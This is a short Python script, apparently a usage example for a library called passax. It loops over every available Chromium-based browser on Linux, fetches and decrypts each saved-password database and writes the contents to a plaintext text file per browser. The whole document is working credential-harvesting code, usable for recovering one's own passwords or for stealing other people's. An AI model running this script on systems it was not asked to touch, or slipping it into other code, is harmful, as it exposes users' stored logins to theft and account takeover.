from passax.chrome import linux as os
from passax.chrome import browsers

for browser in browsers.available_browsers:
    passax_ = os.Chrome(browser, blank_passwords=False)
    passax_.fetch()
    passax_.retrieve_database()
    passax_.save(f"{browser.base_name}_data.txt")